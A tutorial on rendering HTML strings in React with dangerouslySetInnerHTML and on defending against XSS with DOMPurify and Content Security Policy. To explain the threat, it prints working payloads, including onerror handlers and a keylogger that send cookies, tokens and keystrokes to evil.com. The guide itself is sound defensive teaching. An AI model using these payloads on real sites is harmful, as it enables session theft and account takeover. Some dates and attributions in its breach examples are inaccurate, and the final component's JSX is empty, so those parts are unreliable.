The problem every React developer eventually faces
Sooner or later, every React developer hits this situation: you have an HTML string, and you need to render it. Maybe it comes from a CMS like WordPress or Strapi. Maybe a rich text editor like TipTap or Quill produced it. Maybe you are rendering Markdown that has been converted to HTML. Whatever the source, you have a string containing HTML tags, and React is rendering it as literal text instead of markup.
You try the obvious approach:
function BlogPost({ content }: { content: string }) {
return <div>{content}</div>;
}
// Renders: "<p>Hello <strong>world</strong></p>" as plain text
React escapes the HTML entities and renders the raw string. This is not a bug. This is React protecting you.
React escapes HTML by default because rendering arbitrary HTML is one of the most common sources of cross-site scripting (XSS) vulnerabilities in web applications. The React team made a deliberate design decision: the safe path should be the default path. If you want to bypass that safety, you have to be explicit about it. That is where dangerouslySetInnerHTML
comes in.
This guide covers everything you need to know about dangerouslySetInnerHTML
- how it works, when you actually need it, the XSS threats it exposes you to, how to sanitize HTML properly with DOMPurify, how to set up Content Security Policy as defense-in-depth, and when to use alternatives like html-react-parser
or react-markdown
instead. By the end, you will have a production-ready SafeHTML
component and a security checklist for every project that renders raw HTML.
How dangerouslySetInnerHTML works
The API is intentionally awkward. React requires you to pass an object with a __html
key:
function BlogPost({ content }: { content: string }) {
return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
There are three design decisions baked into this API that are worth understanding.
The name is a warning. The React team chose dangerouslySetInnerHTML
specifically because it is ugly and alarming. It is meant to make you pause. In code review, it should immediately trigger scrutiny. If you are grepping a codebase for security risks, dangerouslySetInnerHTML
is one of the first things you search for. The name is doing its job if it makes you uncomfortable.
The double underscore __html
is intentional friction. You cannot accidentally pass a string directly. You have to construct an object with a specific key. This extra step exists to prevent developers from casually injecting HTML. The __html
key name with its double underscore prefix follows a convention that signals "this is an internal, escape-hatch API - use with caution." In early React prototypes, the team considered simpler APIs, but they deliberately chose the verbose version to create a speed bump.
React bypasses virtual DOM diffing for that node. When you use dangerouslySetInnerHTML
, React sets the DOM node's innerHTML
directly and does not attempt to reconcile the children of that node with the virtual DOM. This has implications. You cannot have both dangerouslySetInnerHTML
and child elements on the same node - React will throw an error. The contents of the node are opaque to React. If the HTML string changes, React will replace the entire innerHTML rather than doing granular updates. This means event handlers attached to elements inside the HTML string will not be managed by React's synthetic event system.
Here is how it compares to vanilla JavaScript:
// Vanilla JS
const el = document.getElementById('content');
el.innerHTML = htmlString;
// React equivalent
<div dangerouslySetInnerHTML={{ __html: htmlString }} />
The behavior is identical at the DOM level. React calls innerHTML
under the hood. The difference is that React forces you to be explicit about it, and the component tree makes it visible in code review.
One important constraint: you cannot place children inside a component that uses dangerouslySetInnerHTML
. This will throw a runtime error:
// This will error
<div dangerouslySetInnerHTML={{ __html: content }}>
<p>This causes a React error</p>
</div>
React enforces this because it cannot reconcile manually injected HTML with its own managed children. Pick one approach or the other.
When you actually need dangerouslySetInnerHTML
There are legitimate use cases where rendering raw HTML is unavoidable. Here are the most common ones.
CMS content. If you are pulling content from WordPress, Strapi, Sanity, Contentful, or any headless CMS that stores content as HTML, you will receive HTML strings from the API. The CMS content editor produced formatted text with headings, lists, bold text, images, and links, and all of that comes to your frontend as an HTML string.
Rich text editor output. Editors like TipTap, Slate, Quill, CKEditor, and Froala produce HTML output. When you save the editor content and later display it, you are rendering an HTML string.
Markdown rendered to HTML. If you process Markdown on the server with libraries like marked
, remark
, or markdown-it
, the output is an HTML string. You need to inject it into the DOM somehow.
Email templates. Email template builders and preview systems render HTML that needs to be displayed in the browser.
Legacy content migration. When migrating from older systems, you often inherit HTML content stored in databases. Rewriting thousands of articles into structured data is rarely practical.
Third-party widget embedding. Some analytics dashboards, embedded content providers, and widget systems deliver HTML snippets that need to be injected into your page.
In all of these cases, the HTML comes from somewhere other than your React components, and you need to render it faithfully. The question is not whether to render it - it is how to do it safely.
The XSS threat: a deep dive
Before I show you the safe patterns, you need to understand exactly what you are protecting against. Cross-site scripting (XSS) is not an abstract theoretical risk. It is one of the most common and most exploited vulnerability classes on the web. OWASP consistently ranks it in the top 10. Real applications get compromised through XSS regularly.
What XSS actually is
Cross-site scripting is an attack where a malicious actor injects executable code into a web page that other users view. When the victim's browser renders the page, the injected code runs with the full privileges of that page - it can read cookies, access localStorage, make API requests with the user's session, redirect users to phishing sites, or modify the page content to harvest credentials.
The term "cross-site" comes from the original attack pattern where code from one site would execute in the context of another, but modern XSS does not require a cross-origin component. The key concept is that an attacker gets their code to execute in your user's browser within the security context of your domain.
The three types of XSS
Stored XSS is the most dangerous. The malicious payload is permanently stored on the target server - in a database, message board, comment field, or user profile. Every user who views the affected page executes the attack. If an attacker injects malicious HTML into a blog comment that gets stored in your database and rendered with dangerouslySetInnerHTML
, every visitor to that page is compromised.
Reflected XSS occurs when the malicious payload is part of the request - typically a URL parameter or form input - and the server reflects it back in the response without sanitization. For example, a search results page that renders You searched for: <script>...</script>
using the raw query parameter.
DOM-based XSS happens entirely on the client side. The malicious payload never reaches the server. Instead, client-side JavaScript reads data from an attacker-controlled source (like window.location.hash
or document.referrer
) and injects it into the DOM. Using dangerouslySetInnerHTML
with URL parameters is a textbook DOM-based XSS vulnerability.
Real-world XSS attacks
XSS is not just a CTF exercise. In 2023, the Signal desktop application had a vulnerability where specially crafted messages could execute arbitrary code because the app used dangerouslySetInnerHTML
(or equivalent patterns) to render message content without adequate sanitization. The Samy worm in 2005 exploited stored XSS on MySpace to create the fastest-spreading virus in history, adding over a million friends to the attacker's profile in under 24 hours. British Airways was fined 183 million pounds after XSS-related vulnerabilities led to the compromise of 380,000 customer payment records.
These are not edge cases. XSS is the vulnerability class that keeps happening because developers underestimate it.
How XSS attacks work with dangerouslySetInnerHTML
Let me show you exactly how an attacker exploits dangerouslySetInnerHTML
. Here is a common misconception: many developers think XSS means injecting <script>
tags. They test by injecting a script tag, see that it does not execute, and conclude they are safe.
They are wrong.
When you set innerHTML
on a DOM node (which is what dangerouslySetInnerHTML
does), the browser does not execute <script>
tags in the injected content. This is per the HTML5 specification. But that does not protect you at all, because there are dozens of other ways to execute JavaScript via HTML injection.
Event handler injection is the most common attack vector:
// Attacker submits this as a "comment"
const maliciousComment = `
<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)" />
`;
// Your vulnerable component renders it
function Comment({ html }: { html: string }) {
return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
The <img>
tag has an invalid src
, which triggers the onerror
handler. The handler sends the user's cookies to the attacker's server. The user sees a broken image and thinks nothing of it. The attacker now has their session cookie.
Here are more attack vectors that bypass naive <script>
filtering:
// onerror on image tags
const payload1 = `<img src=x onerror="alert(document.cookie)">`;
// onmouseover triggers on hover
const payload2 = `<div onmouseover="alert(document.cookie)">Hover over me</div>`;
// onfocus with autofocus fires immediately
const payload3 = `<input onfocus="alert(document.cookie)" autofocus>`;
// onload on body/iframe/svg
const payload4 = `<svg onload="alert(document.cookie)">`;
// CSS expression (older IE, but SVG still works)
const payload5 = `<svg><animate onbegin="alert(document.cookie)" attributeName="x" dur="1s">`;
// javascript: protocol in links
const payload6 = `<a href="javascript:alert(document.cookie)">Click me</a>`;
// data: URI with base64-encoded script
const payload7 = `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>`;
// Meta refresh redirect
const payload8 = `<meta http-equiv="refresh" content="0;url=https://evil.com">`;
SVG-based XSS is particularly insidious because SVGs are XML documents that support inline JavaScript. If your application allows SVG uploads or SVG content in HTML strings, the attack surface is enormous:
const svgPayload = `
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.cookie)</script>
<foreignObject>
<body xmlns="http://www.w3.org/1999/xhtml">
<img src=x onerror="fetch('https://evil.com/steal?data='+localStorage.getItem('token'))"/>
</body>
</foreignObject>
</svg>
`;
What an attacker can steal
Once JavaScript executes in the context of your page, the attacker has access to everything your frontend code has access to:
// Steal session cookies
document.cookie;
// Steal JWT tokens from localStorage
localStorage.getItem('access_token');
localStorage.getItem('refresh_token');
// Steal data from sessionStorage
sessionStorage.getItem('user_data');
// Make authenticated API requests on behalf of the user
fetch('/api/account/delete', {
method: 'POST',
credentials: 'include'
});
// Read the entire DOM, including form fields with passwords
document.querySelector('input[type="password"]').value;
// Redirect to a phishing page that looks identical
window.location = 'https://evil-clone.com/login';
// Keylog everything the user types
document.addEventListener('keydown', (e) => {
fetch('https://evil.com/log?key=' + e.key);
});
This is not hypothetical. This is what XSS attacks do in the wild. The attacker can silently exfiltrate data, take actions on the user's behalf, or redirect them to credential-harvesting pages.
Vulnerable vs. safe implementation
Here is the vulnerable pattern that gets shipped to production constantly:
// VULNERABLE - Never do this
function UserProfile({ bio }: { bio: string }) {
return (
<div className="profile-bio">
<h3>About</h3>
<div dangerouslySetInnerHTML={{ __html: bio }} />
</div>
);
}
If bio
comes from user input - a profile field, a comment, a forum post - an attacker can set their bio to any of the payloads above and compromise every user who views their profile.
Here is the safe pattern:
// SAFE - Always sanitize
function UserProfile({ bio }: { bio: string }) {
const sanitizedBio = DOMPurify.sanitize(bio);
return (
<div className="profile-bio">
<h3>About</h3>
<div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />
</div>
);
}
The difference is one line of code. That one line is the difference between a secure application and a data breach.
Sanitization with DOMPurify
DOMPurify is the industry standard library for HTML sanitization in JavaScript. It is maintained by security researcher Cure53, has been audited multiple times, handles edge cases that would take years to discover on your own, and is used by Google, Mozilla, and thousands of production applications. Do not try to write your own sanitizer. Use DOMPurify.
Installation and basic usage
npm install dompurify
npm install --save-dev @types/dompurify
Basic usage is straightforward:
const dirty = '<p>Hello</p><img src=x onerror="alert(1)"><script>alert(2)</script>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<p>Hello</p><img src="x">'
// The onerror handler and script tag are stripped
DOMPurify parses the HTML string, builds a DOM tree, walks every node and attribute, removes anything dangerous, and serializes the clean tree back to an HTML string. It handles hundreds of bypass techniques including mutation XSS, namespace confusion, Unicode tricks, and parser differentials.
Configuration options
DOMPurify's default configuration is secure for most use cases, but you can customize it:
// Only allow specific tags
const clean = DOMPurify.sanitize(dirty, {
ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'h1', 'h2', 'h3'],
ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
});
// Forbid specific tags while allowing everything else
const clean2 = DOMPurify.sanitize(dirty, {
FORBID_TAGS: ['style', 'form', 'input', 'textarea', 'select'],
FORBID_ATTR: ['style', 'onclick', 'onmouseover'],
});
// Allow data attributes
const clean3 = DOMPurify.sanitize(dirty, {
ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'data-*'],
});
// Return a DOM node instead of a string (useful for further processing)
const cleanNode = DOMPurify.sanitize(dirty, { RETURN_DOM: true });
// Return a DocumentFragment
const cleanFragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
For CMS content where you need rich formatting, a practical configuration looks like this:
const CMS_SANITIZE_CONFIG = {
ALLOWED_TAGS: [
'p', 'br', 'hr',
'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
'b', 'i', 'em', 'strong', 'u', 's', 'del', 'ins',
'a', 'img', 'figure', 'figcaption',
'ul', 'ol', 'li',
'blockquote', 'pre', 'code',
'table', 'thead', 'tbody', 'tr', 'th', 'td',
'div', 'span',
'sup', 'sub',
],
ALLOWED_ATTR: [
'href', 'target', 'rel',
'src', 'alt', 'width', 'height', 'loading',
'class', 'id',
'colspan', 'rowspan',
],
ALLOW_DATA_ATTR: false,
};
function CMSContent({ html }: { html: string }) {
const clean = DOMPurify.sanitize(html, CMS_SANITIZE_CONFIG);
return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
Sanitizing URLs
URL attributes (href
, src
, action
) are a common XSS vector because of the javascript:
protocol. DOMPurify handles this by default, but you can also add custom URI sanitization:
// DOMPurify blocks javascript: URIs by default
DOMPurify.sanitize('<a href="javascript:alert(1)">click</a>');
// Result: '<a>click</a>' - the href is removed
// You can whitelist specific URI schemes
const clean = DOMPurify.sanitize(dirty, {
ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
});
DOMPurify hooks for custom filtering
DOMPurify provides hooks that let you add custom filtering logic. This is powerful for enforcing application-specific security policies:
// Force all links to open in new tab with noopener
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
if (node.tagName === 'A') {
node.setAttribute('target', '_blank');
node.setAttribute('rel', 'noopener noreferrer');
}
// Force lazy loading on all images
if (node.tagName === 'IMG') {
node.setAttribute('loading', 'lazy');
}
});
// Remove elements with suspicious class names
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
if (node.className && /tracking|analytics|pixel/.test(node.className)) {
node.remove();
}
});
// Log removed elements for monitoring
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
if (data.allowedTags && !data.allowedTags[data.tagName]) {
console.warn(`DOMPurify removed <${data.tagName}> tag`);
}
});
Remember to remove hooks when they are no longer needed to avoid memory leaks and unexpected behavior in other parts of your application:
DOMPurify.removeHook('afterSanitizeAttributes');
DOMPurify.removeAllHooks();
Server-side sanitization with isomorphic-dompurify
If you are using Next.js or any server-side rendering framework, the standard dompurify
package will not work in Node.js because it depends on the browser DOM. Use isomorphic-dompurify
instead:
npm install isomorphic-dompurify
// Works in both browser and Node.js
const clean = DOMPurify.sanitize(dirty);
isomorphic-dompurify
uses jsdom
under the hood on the server to provide the DOM APIs that DOMPurify needs. The API is identical. For Next.js applications, this is the right choice because your components may render on both the server and client.
Performance characteristics
DOMPurify is fast. On a modern machine, it sanitizes approximately 2-4 MB of HTML per second. For typical use cases - blog posts, comments, CMS pages - sanitization takes well under a millisecond. Even for large documents, it rarely exceeds 10ms. The performance cost is negligible compared to the security it provides.
If you are sanitizing the same content repeatedly (for example, in a list of comments that re-renders), you can memoize the result:
function Comment({ html }: { html: string }) {
const sanitizedHtml = useMemo(
() => DOMPurify.sanitize(html),
[html]
);
return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
}
Content Security Policy as defense-in-depth
Sanitization with DOMPurify is your primary defense against XSS. Content Security Policy (CSP) is your second line of defense. If sanitization fails - because of a DOMPurify bypass, a misconfiguration, or a code path that skips sanitization - CSP can prevent the attack from executing.
What CSP does
Content Security Policy is an HTTP header (or meta tag) that tells the browser which sources of content are allowed to execute on your page. If an attacker manages to inject a script tag or an inline event handler, CSP can block it from executing.
Meta tag vs HTTP header
You can set CSP via an HTTP header (recommended) or a meta tag:
# HTTP header (preferred - set in your server/CDN config)
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
<!-- Meta tag (fallback if you cannot set headers) -->
<meta http-equiv="Content-Security-Policy"
content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;">
The HTTP header is preferred because it cannot be injected or modified by an attacker (unlike a meta tag that could theoretically be overridden via HTML injection before the browser parses it).
Recommended CSP for React applications
Here is a practical CSP configuration for a React application that renders HTML content:
Content-Security-Policy:
default-src 'self';
script-src 'self' 'nonce-{RANDOM}';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self' https://fonts.gstatic.com;
connect-src 'self' https://api.yourdomain.com;
frame-src 'none';
object-src 'none';
base-uri 'self';
form-action 'self';
The key directives for XSS protection:
-
script-src 'self' 'nonce-{RANDOM}'
- Only scripts from your origin or with a valid nonce can execute. Inline event handlers injected via XSS will be blocked because they do not have the nonce. -
object-src 'none'
- Blocks Flash and other plugin-based attacks. -
base-uri 'self'
- Prevents base tag injection that can redirect script loads. -
form-action 'self'
- Prevents injected forms from submitting data to external servers.
The important thing to understand is that CSP blocks inline event handlers by default when you do not include 'unsafe-inline'
in script-src
. This means that even if DOMPurify somehow misses an onerror
handler, the browser will refuse to execute it. This is exactly the kind of defense-in-depth layering you want.
CSP reporting
You can configure CSP to report violations without blocking them, which is useful for deploying CSP gradually:
# Report-only mode - logs violations without blocking
Content-Security-Policy-Report-Only:
default-src 'self';
script-src 'self';
report-uri /api/csp-report;
Start with report-only mode, collect violation reports for a week, fix any legitimate sources that are being blocked, then switch to enforcement mode. This prevents CSP from breaking your application in production.
Building a reusable SafeHTML component
Now let me put it all together into a production-ready component that you can drop into any React project.
/**
* Default set of HTML tags considered safe for rendering user content.
*/
const DEFAULT_ALLOWED_TAGS = [
'p', 'br', 'hr',
'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
'b', 'i', 'em', 'strong', 'u', 's', 'del', 'ins', 'mark',
'a',
'img', 'figure', 'figcaption',
'ul', 'ol', 'li',
'blockquote', 'pre', 'code',
'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption',
'div', 'span',
'sup', 'sub',
'abbr', 'time',
'details', 'summary',
];
const DEFAULT_ALLOWED_ATTR = [
'href', 'target', 'rel',
'src', 'alt', 'width', 'height', 'loading',
'class', 'id',
'colspan', 'rowspan',
'datetime', 'title',
'open',
];
interface SafeHTMLProps {
/** The raw HTML string to sanitize and render */
html: string;
/** HTML tags to allow (overrides defaults) */
allowedTags?: string[];
/** HTML attributes to allow (overrides defaults) */
allowedAttributes?: string[];
/** Additional DOMPurify configuration */
sanitizeOptions?: DOMPurify.Config;
/** Wrapper element type */
as?: keyof JSX.IntrinsicElements;
/** CSS class name for the wrapper */
className?: string;
/** Inline styles for the wrapper */
style?: CSSProperties;
}
/**
* SafeHTML renders an HTML string after sanitizing it with DOMPurify.
*
* Usage:
*
*
*
*/
export function SafeHTML({
html,
allowedTags = DEFAULT_ALLOWED_TAGS,
allowedAttributes = DEFAULT_ALLOWED_ATTR,
sanitizeOptions = {},
as: Element = 'div',
className,
style,
}: SafeHTMLProps) {
const sanitizedHtml = useMemo(() => {
if (!html) return '';
return DOMPurify.sanitize(html, {
ALLOWED_TAGS: allowedTags,
ALLOWED_ATTR: allowedAttributes,
ALLOW_DATA_ATTR: false,
...sanitizeOptions,
});
}, [html, allowedTags, allowedAttributes, sanitizeOptions]);
return (
);
}
This component does several things right:
- Sanitization is automatic. You cannot render HTML through this component without it being sanitized. No developer on your team can forget to call DOMPurify.
- Defaults are restrictive. The default allowed tags and attributes are a whitelist. Anything not explicitly allowed is stripped.
-
Memoization prevents unnecessary re-sanitization. The
useMemo
hook ensures sanitization only runs when the HTML string or configuration changes. - The API is flexible. You can override tags, attributes, and DOMPurify config for different use cases.
- TypeScript types enforce correct usage. The compiler catches mistakes at build time.
